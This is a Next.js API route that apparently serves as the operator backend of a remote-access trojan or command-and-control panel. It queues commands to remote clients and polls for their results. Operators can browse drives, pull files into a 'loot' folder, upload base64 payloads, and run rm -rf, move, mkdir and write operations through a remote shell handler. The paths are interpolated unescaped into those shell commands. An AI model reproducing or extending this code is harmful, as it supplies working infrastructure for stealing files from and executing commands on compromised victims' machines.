import { NextRequest, NextResponse } from 'next/server'
import { createCommand } from '@/lib/commands'
import { getDatabase } from '@/lib/db'
import fs from 'fs'
import path from 'path'

export const dynamic = 'force-dynamic'

// ─── helper: send a command to a client and wait for result (polling) ───────
async function sendAndWait(
  clientId: string,
  commandType: string,
  params: Record<string, any>,
  timeoutMs = 20000
): Promise<any> {
  const db = getDatabase()

  // Create command record
  const { createCommand: cc } = await import('@/lib/commands')
  const cmd = cc({ client_id: clientId, command_type: commandType, command_name: commandType, parameters: params })

  // Poll for result
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    await new Promise(r => setTimeout(r, 400))
    const row = db.prepare('SELECT status,result,error_message FROM commands WHERE id = ?').get(cmd.id) as any
    if (!row) throw new Error('Command not found')
    if (row.status === 'completed') {
      const data = row.result ? JSON.parse(row.result) : {}
      return data
    }
    if (row.status === 'failed') throw new Error(row.error_message || 'Command failed')
  }
  throw new Error('Timed out waiting for client response')
}

// ─── GET /api/filebrowser?action=browse&clientId=...&path=... ────────────────
export async function GET(request: NextRequest) {
  const sp = request.nextUrl.searchParams
  const action = sp.get('action') || 'browse'
  const clientId = sp.get('clientId') || ''
  const filePath = sp.get('path') || ''

  if (!clientId) return NextResponse.json({ error: 'clientId required' }, { status: 400 })

  try {
    if (action === 'browse') {
      const result = await sendAndWait(clientId, 'file_browser', { path: filePath || undefined })
      if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
      return NextResponse.json(result)
    }

    if (action === 'list_drives') {
      const result = await sendAndWait(clientId, 'list_drives', {})
      return NextResponse.json(result)
    }

    if (action === 'download') {
      // Ask client to download (sends as loot); return loot path
      if (!filePath) return NextResponse.json({ error: 'path required' }, { status: 400 })
      const result = await sendAndWait(clientId, 'download', { path: filePath }, 60000)
      if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })

      // Find the loot file saved by s.py
      const lootDir = path.join(process.cwd(), 'loot', 'file')
      const filename = result.filename || path.basename(filePath)
      const lootPath = path.join(lootDir, filename)

      if (fs.existsSync(lootPath)) {
        const buf = fs.readFileSync(lootPath)
        return new NextResponse(buf, {
          headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': `attachment; filename="${filename}"`,
          },
        })
      }

      // If not yet saved, return the result info so FE can try again
      return NextResponse.json({ ...result, message: 'Download queued; file may appear in loot shortly' })
    }

    return NextResponse.json({ error: 'Unknown action' }, { status: 400 })
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Unknown error' }, { status: 500 })
  }
}

// ─── POST /api/filebrowser ───────────────────────────────────────────────────
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { action, clientId, path: filePath, data, newPath, content } = body

    if (!clientId) return NextResponse.json({ error: 'clientId required' }, { status: 400 })

    if (action === 'upload') {
      // data is base64 encoded file content
      const { filename, targetPath, data: fileData } = body
      if (!fileData || !filename) return NextResponse.json({ error: 'filename and data required' }, { status: 400 })
      const result = await sendAndWait(clientId, 'upload', { filename, target_path: targetPath || filePath, data: fileData }, 30000)
      if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
      return NextResponse.json({ success: true, ...result })
    }

    if (action === 'delete') {
      if (!filePath) return NextResponse.json({ error: 'path required' }, { status: 400 })
      // Use shell command to delete (cross-platform via d.py shell handler)
      const isWindows = !filePath.startsWith('/')
      const delCmd = isWindows ? `del /f /q "${filePath}"` : `rm -rf "${filePath}"`
      const result = await sendAndWait(clientId, 'shell', { command: delCmd }, 15000)
      if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
      return NextResponse.json({ success: true })
    }

    if (action === 'rename' || action === 'move') {
      if (!filePath || !newPath) return NextResponse.json({ error: 'path and newPath required' }, { status: 400 })
      const isWindows = !filePath.startsWith('/')
      const cmd = isWindows ? `move "${filePath}" "${newPath}"` : `mv "${filePath}" "${newPath}"`
      const result = await sendAndWait(clientId, 'shell', { command: cmd }, 15000)
      return NextResponse.json({ success: true })
    }

    if (action === 'mkdir') {
      if (!filePath) return NextResponse.json({ error: 'path required' }, { status: 400 })
      const isWindows = !filePath.startsWith('/')
      const cmd = isWindows ? `mkdir "${filePath}"` : `mkdir -p "${filePath}"`
      await sendAndWait(clientId, 'shell', { command: cmd }, 10000)
      return NextResponse.json({ success: true })
    }

    if (action === 'write') {
      if (!filePath || content === undefined) return NextResponse.json({ error: 'path and content required' }, { status: 400 })
      const result = await sendAndWait(clientId, 'write_file', { path: filePath, content }, 15000)
      if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
      return NextResponse.json({ success: true })
    }

    return NextResponse.json({ error: 'Unknown action' }, { status: 400 })
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Unknown error' }, { status: 500 })
  }
}
